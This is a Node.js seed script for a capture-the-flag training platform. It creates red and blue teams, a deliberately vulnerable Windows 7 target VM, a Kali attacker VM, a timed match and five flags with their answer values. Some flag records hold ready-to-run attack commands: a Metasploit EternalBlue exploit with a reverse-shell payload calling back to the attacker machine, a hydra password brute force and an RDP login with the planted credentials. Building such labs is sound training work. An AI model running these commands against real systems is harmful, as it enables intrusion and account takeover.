const { Match, Team, User, VM } = require('../models');
const { Op } = require('sequelize');

async function setupCyberWarMatch() {
  try {
    console.log('=== Setting up Cyber Warfare Match ===\n');

    // Step 1: Create or get teams
    console.log('1. Setting up teams...');
    
    let team1 = await Team.findOne({ where: { name: 'RedTeam' } });
    if (!team1) {
      team1 = await Team.create({
        name: 'RedTeam',
        description: 'Offensive security team',
        color: '#dc3545',
        maxMembers: 4,
        isPublic: true,
        isActive: true,
        currentPoints: 0,
        totalFlags: 0,
        createdBy: 1 // Admin user ID
      });
      console.log('✅ Created Red Team');
    } else {
      console.log('✅ Red Team already exists');
    }

    let team2 = await Team.findOne({ where: { name: 'BlueTeam' } });
    if (!team2) {
      team2 = await Team.create({
        name: 'BlueTeam',
        description: 'Defensive security team',
        color: '#0d6efd',
        maxMembers: 4,
        isPublic: true,
        isActive: true,
        currentPoints: 0,
        totalFlags: 0,
        createdBy: 1 // Admin user ID
      });
      console.log('✅ Created Blue Team');
    } else {
      console.log('✅ Blue Team already exists');
    }

    // Step 2: Create VMs
    console.log('\n2. Setting up VMs...');
    
    // Target VM (Windows 7 vulnerable server)
    let targetVM = await VM.findOne({ where: { vmId: '102' } });
    if (!targetVM) {
      targetVM = await VM.create({
        vmId: '102',
        ipAddress: '172.16.26.132',
        name: 'Target-Server-Win7',
        os: 'Windows 7',
        status: 'running',
        description: 'Vulnerable Windows 7 target server',
        isTarget: true,
        userId: 1, // Admin user ID
        labId: 1, // Default lab ID
        vulnerabilities: JSON.stringify([
          'ms17-010',
          'eternalblue',
          'smb_v1',
          'weak_passwords',
          'open_ports'
        ])
      });
      console.log('✅ Created Target VM (ID: 102, IP: 172.16.26.132)');
    } else {
      console.log('✅ Target VM already exists');
    }

    // Attacker VM
    let attackerVM = await VM.findOne({ where: { vmId: '103' } });
    if (!attackerVM) {
      attackerVM = await VM.create({
        vmId: '103',
        ipAddress: '172.16.200.136',
        name: 'Attacker-Kali',
        os: 'Kali Linux',
        status: 'running',
        description: 'Kali Linux attacker machine',
        isAttacker: true,
        userId: 1, // Admin user ID
        labId: 1, // Default lab ID
        tools: JSON.stringify([
          'nmap',
          'metasploit',
          'nuclei',
          'nikto',
          'dirb'
        ])
      });
      console.log('✅ Created Attacker VM (ID: 103, IP: 172.16.200.136)');
    } else {
      console.log('✅ Attacker VM already exists');
    }

    // Step 3: Create the match
    console.log('\n3. Creating the match...');
    
    const matchData = {
      name: 'Windows 7 Vulnerability Hunt',
      description: 'Find and exploit vulnerabilities in the Windows 7 target server. Teams compete to discover and exploit vulnerabilities for points.',
      status: 'waiting',
      matchType: 'capture_flag',
      maxTeams: 2,
      duration: 3600, // 1 hour
      startTime: new Date(Date.now() + 5 * 60 * 1000), // Start in 5 minutes
      endTime: new Date(Date.now() + 65 * 60 * 1000), // End in 65 minutes
      scoringRules: JSON.stringify({
        flagCapture: 100,
        vulnerabilityExploit: 50,
        serviceHijack: 25,
        defensePoints: 10,
        timeBonus: 5,
        penalties: {
          downtime: -20,
          cheating: -100
        }
      }),
      networkConfig: JSON.stringify({
        targetSubnet: '172.16.26.0/24',
        attackerSubnet: '172.16.200.0/24',
        targetVM: targetVM.id,
        attackerVMs: [attackerVM.id]
      }),
      autoScoring: true,
      elkIntegration: true,
      createdBy: 1 // Admin user ID
    };

    let match = await Match.findOne({ 
      where: { 
        name: matchData.name,
        status: { [Op.in]: ['waiting', 'active'] }
      }
    });

    if (!match) {
      match = await Match.create(matchData);
      console.log('✅ Created match: Windows 7 Vulnerability Hunt');
    } else {
      console.log('✅ Match already exists');
    }

    // Step 4: Assign teams to match
    console.log('\n4. Assigning teams to match...');
    
    await match.addTeam(team1);
    await match.addTeam(team2);
    console.log('✅ Teams assigned to match');

    // Step 5: Create vulnerability flags
    console.log('\n5. Creating vulnerability flags...');
    
    const { Flag } = require('../models');
    
    const vulnerabilities = [
      {
        name: 'MS17-010 EternalBlue',
        description: 'Exploit the MS17-010 vulnerability using EternalBlue',
        flagValue: 'CYBERWAR{eternalblue_ms17_010}',
        points: 200,
        category: 'pwn',
        difficulty: 'intermediate',
        isActive: true,
        matchId: match.id,
        vulnerability: 'ms17-010',
        exploitCommand: 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 172.16.26.132; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 172.16.200.136; run"'
      },
      {
        name: 'SMB Version 1',
        description: 'Discover SMB version 1 is enabled',
        flagValue: 'CYBERWAR{smb_v1_enabled}',
        points: 50,
        category: 'network',
        difficulty: 'beginner',
        isActive: true,
        matchId: match.id,
        vulnerability: 'smb_v1',
        detectionCommand: 'nmap -p 445 --script smb-protocols 172.16.26.132'
      },
      {
        name: 'Open Ports Discovery',
        description: 'Find all open ports on the target',
        flagValue: 'CYBERWAR{ports_21_22_80_445_3389}',
        points: 75,
        category: 'network',
        difficulty: 'beginner',
        isActive: true,
        matchId: match.id,
        vulnerability: 'open_ports',
        detectionCommand: 'nmap -sS -p- 172.16.26.132'
      },
      {
        name: 'Weak Password',
        description: 'Successfully brute force a user account',
        flagValue: 'CYBERWAR{admin_password123}',
        points: 150,
        category: 'pwn',
        difficulty: 'intermediate',
        isActive: true,
        matchId: match.id,
        vulnerability: 'weak_passwords',
        exploitCommand: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.16.26.132 smb'
      },
      {
        name: 'RDP Access',
        description: 'Gain RDP access to the target',
        flagValue: 'CYBERWAR{rdp_access_gained}',
        points: 100,
        category: 'pwn',
        difficulty: 'intermediate',
        isActive: true,
        matchId: match.id,
        vulnerability: 'rdp_access',
        exploitCommand: 'xfreerdp /v:172.16.26.132 /u:admin /p:password123'
      }
    ];

    for (const vuln of vulnerabilities) {
      const existingFlag = await Flag.findOne({ 
        where: { 
          name: vuln.name,
          matchId: match.id
        }
      });
      
      if (!existingFlag) {
        await Flag.create({
          ...vuln,
          createdBy: 1 // Admin user ID
        });
        console.log(`✅ Created flag: ${vuln.name}`);
      } else {
        console.log(`✅ Flag already exists: ${vuln.name}`);
      }
    }

    // Step 6: Set up ELK integration
    console.log('\n6. Setting up ELK integration...');
    
    // Update match with ELK configuration
    await match.update({
      elkConfig: JSON.stringify({
        elasticsearchUrl: 'http://172.16.200.136:9200',
        kibanaUrl: 'http://172.16.200.136:5601',
        logstashUrl: 'http://172.16.200.136:5044',
        indexPattern: `cyberwar-${match.id}-*`,
        enablePacketAnalysis: true,
        enableAutoScoring: true,
        enableRealTimeScoring: true
      })
    });

    console.log('✅ ELK integration configured');

    // Step 7: Print match summary
    console.log('\n=== Match Setup Complete ===');
    console.log(`Match ID: ${match.id}`);
    console.log(`Match Name: ${match.name}`);
    console.log(`Status: ${match.status}`);
    console.log(`Start Time: ${match.startTime}`);
    console.log(`Duration: ${match.duration / 60} minutes`);
    console.log(`Teams: ${team1.name}, ${team2.name}`);
    console.log(`Target VM: ${targetVM.name} (${targetVM.ipAddress})`);
    console.log(`Attacker VM: ${attackerVM.name} (${attackerVM.ipAddress})`);
    console.log(`Flags Created: ${vulnerabilities.length}`);
    console.log(`ELK Integration: Enabled`);

    console.log('\n=== Next Steps ===');
    console.log('1. Start the match using the admin dashboard');
    console.log('2. Teams can join and get assigned to the attacker VM');
    console.log('3. Automated scoring will begin when vulnerabilities are detected');
    console.log('4. Monitor progress in Kibana dashboard');

  } catch (error) {
    console.error('Error setting up match:', error);
  } finally {
    process.exit(0);
  }
}

setupCyberWarMatch();
